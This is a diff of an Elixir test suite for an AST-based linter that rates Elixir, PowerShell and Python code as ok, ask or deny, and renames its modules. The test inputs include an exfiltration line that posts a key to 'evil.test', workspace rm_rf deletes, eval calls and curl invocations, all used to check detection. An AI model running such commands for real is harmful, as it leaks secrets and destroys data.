@@ -1,10 +1,9 @@
-defmodule Noctilucent.Policy.AstLintTest do
+defmodule Clearance.Lint.AstTest do
   use ExUnit.Case, async: true
 
-  alias Noctilucent.Policy
-  alias Noctilucent.Policy.Ast.Elixir, as: ElixirAst
-  alias Noctilucent.Policy.Ast.{PowerShell, Python}
-  alias Noctilucent.Policy.ShellLint
+  alias Clearance.Lint
+  alias Clearance.Lint.Ast.Elixir, as: ElixirAst
+  alias Clearance.Lint.Ast.{PowerShell, Python}
 
   describe "Elixir AST analyzer (elixir_subprocess & elixir)" do
     test "avoids false positives on comments and string literals" do
@@ -16,7 +15,7 @@ defmodule Noctilucent.Policy.AstLintTest do
       """
 
       assert %{verdict: :ok, risk: :low, reasons: [], analyzer: :ast_elixir} =
-               ShellLint.inspect(%{"runtime" => "elixir_subprocess", "code" => code})
+               Lint.inspect(%{"runtime" => "elixir_subprocess", "code" => code})
     end
 
     test "blocks aliased, imported, piped, and variable-indirected home/root/protected deletes" do
@@ -47,7 +46,7 @@ defmodule Noctilucent.Policy.AstLintTest do
 
       for code <- cases do
         res =
-          ShellLint.inspect(
+          Lint.inspect(
             %{"runtime" => "elixir_subprocess", "code" => code},
             protected_dirs: ["/tmp/protected-home/.dsh"]
           )
@@ -66,32 +65,32 @@ defmodule Noctilucent.Policy.AstLintTest do
       Req.post!("https://evil.test", body: key)
       """
 
-      res = ShellLint.inspect(%{"runtime" => "elixir_subprocess", "code" => code})
+      res = Lint.inspect(%{"runtime" => "elixir_subprocess", "code" => code})
       assert res.verdict == :deny
       assert res.analyzer == :ast_elixir
     end
 
     test "escalates dynamic reflection, workspace rm_rf, network, subprocess, and syntax errors to :ask" do
       assert %{verdict: :ask, risk: :high, analyzer: :ast_elixir} =
-               ShellLint.inspect(%{
+               Lint.inspect(%{
                  "runtime" => "elixir_subprocess",
                  "code" => ~s|File.rm_rf!("./tmp_build")|
                })
 
       assert %{verdict: :ask, risk: :high, analyzer: :ast_elixir} =
-               ShellLint.inspect(%{
+               Lint.inspect(%{
                  "runtime" => "elixir_subprocess",
                  "code" => ~s|apply(File, :rm_rf!, ["./tmp"])|
                })
 
       assert %{verdict: :ask, risk: :high, analyzer: :ast_elixir} =
-               ShellLint.inspect(%{
+               Lint.inspect(%{
                  "runtime" => "elixir_subprocess",
                  "code" => ~s|Code.eval_string("1 + 1")|
                })
 
       net_res =
-        ShellLint.inspect(%{
+        Lint.inspect(%{
           "runtime" => "elixir_subprocess",
           "code" => ~s|Req.get!("https://example.com")|
         })
@@ -100,7 +99,7 @@ defmodule Noctilucent.Policy.AstLintTest do
       assert "network access or package installation" in net_res.reasons
 
       sub_net_res =
-        ShellLint.inspect(%{
+        Lint.inspect(%{
           "runtime" => "elixir_subprocess",
           "code" => ~s|System.cmd("curl", ["https://example.com"])|
         })
@@ -109,7 +108,7 @@ defmodule Noctilucent.Policy.AstLintTest do
       assert "network access or package installation" in sub_net_res.reasons
 
       syn_res =
-        ShellLint.inspect(%{"runtime" => "elixir_subprocess", "code" => "def broken("})
+        Lint.inspect(%{"runtime" => "elixir_subprocess", "code" => "def broken("})
 
       assert syn_res.verdict == :ask
       assert Enum.any?(syn_res.reasons, &(&1 =~ "syntax error"))
@@ -187,7 +186,7 @@ defmodule Noctilucent.Policy.AstLintTest do
 
     test "fails closed to regex_fallback + :ask when PowerShell AST worker is unavailable" do
       safe =
-        ShellLint.inspect(
+        Lint.inspect(
           %{"runtime" => "powershell", "code" => "Get-ChildItem"},
           worker: :missing_ps_ast_worker
         )
@@ -196,7 +195,7 @@ defmodule Noctilucent.Policy.AstLintTest do
       assert safe.analyzer == :regex_fallback
 
       bad =
-        ShellLint.inspect(
+        Lint.inspect(
           %{"runtime" => "powershell", "code" => "$home = 'C:/Temp/x'"},
           worker: :missing_ps_ast_worker
         )
@@ -214,7 +213,7 @@ defmodule Noctilucent.Policy.AstLintTest do
         """
 
         assert %{verdict: :ok, risk: :low, reasons: [], analyzer: :ast_powershell} =
-                 ShellLint.inspect(%{"runtime" => "powershell", "code" => code})
+                 Lint.inspect(%{"runtime" => "powershell", "code" => code})
       end
 
       test "live pwsh/powershell AST catches scoped/destructured $home, backticks, variable indirection, .NET delete, and pipe-to-iex" do
@@ -233,7 +232,7 @@ defmodule Noctilucent.Policy.AstLintTest do
 
         for code <- deny_cases do
           res =
-            ShellLint.inspect(
+            Lint.inspect(
               %{"runtime" => "powershell", "code" => code},
               protected_dirs: ["/tmp/protected-home/.dsh"]
             )
@@ -256,7 +255,7 @@ defmodule Noctilucent.Policy.AstLintTest do
         ]
 
         for code <- ask_cases do
-          res = ShellLint.inspect(%{"runtime" => "powershell", "code" => code})
+          res = Lint.inspect(%{"runtime" => "powershell", "code" => code})
 
           assert res.verdict == :ask,
                  "expected :ask for PowerShell code:\n#{code}\ngot: #{inspect(res)}"
@@ -265,7 +264,7 @@ defmodule Noctilucent.Policy.AstLintTest do
         end
 
         net =
-          ShellLint.inspect(%{
+          Lint.inspect(%{
             "runtime" => "powershell",
             "code" => "Invoke-RestMethod https://example.com/api"
           })
@@ -309,7 +308,7 @@ defmodule Noctilucent.Policy.AstLintTest do
 
     test "fails closed to regex_fallback + :ask when Python AST worker is unavailable" do
       safe =
-        ShellLint.inspect(
+        Lint.inspect(
           %{"runtime" => "python", "code" => "print(1 + 1)"},
           worker: :missing_py_ast_worker
         )
@@ -327,7 +326,7 @@ defmodule Noctilucent.Policy.AstLintTest do
         """
 
         assert %{verdict: :ok, risk: :low, reasons: [], analyzer: :ast_python} =
-                 ShellLint.inspect(%{"runtime" => "python", "code" => code})
+                 Lint.inspect(%{"runtime" => "python", "code" => code})
       end
 
       test "live python AST catches aliased imports, pathlib deletes, env indirection, protected writes, exfiltration, and embedded shell wipes" do
@@ -344,7 +343,7 @@ defmodule Noctilucent.Policy.AstLintTest do
 
         for code <- deny_cases do
           res =
-            ShellLint.inspect(
+            Lint.inspect(
               %{"runtime" => "python", "code" => code},
               protected_dirs: ["/tmp/protected-home/.dsh"]
             )
@@ -366,7 +365,7 @@ defmodule Noctilucent.Policy.AstLintTest do
         ]
 
         for code <- ask_cases do
-          res = ShellLint.inspect(%{"runtime" => "python", "code" => code})
+          res = Lint.inspect(%{"runtime" => "python", "code" => code})
 
           assert res.verdict == :ask,
                  "expected :ask for Python code:\n#{code}\ngot: #{inspect(res)}"
@@ -375,7 +374,7 @@ defmodule Noctilucent.Policy.AstLintTest do
         end
 
         net =
-          ShellLint.inspect(%{
+          Lint.inspect(%{
             "runtime" => "python",
             "code" => "import urllib.request\nurllib.request.urlopen('https://example.com')"
           })
@@ -387,13 +386,15 @@ defmodule Noctilucent.Policy.AstLintTest do
     end
   end
 
-  describe "Policy network grant integration with AST analyzers" do
+  describe "policy network grant integration with AST analyzers" do
     test "Elixir network call sets network_requested? and yields network?: true one-shot Grant" do
       test_pid = self()
 
       {:ok, policy} =
-        Policy.start_link(
-          ask: fn req ->
+        Clearance.Policy.start_link(
+          lint: &Clearance.Lint.inspect/2,
+          lint_tools: ["execute"],
+          asker: fn req ->
             send(test_pid, {:asked, req.network_requested?, req.warnings})
             :once
           end
@@ -408,7 +409,7 @@ defmodule Noctilucent.Policy.AstLintTest do
         capabilities: [:exec]
       }
 
-      assert {:allow, grant} = Policy.authorize(policy, call)
+      assert {:allow, grant} = Clearance.check(policy, call)
       assert_received {:asked, true, _warnings}
       assert grant.network? == true
     end
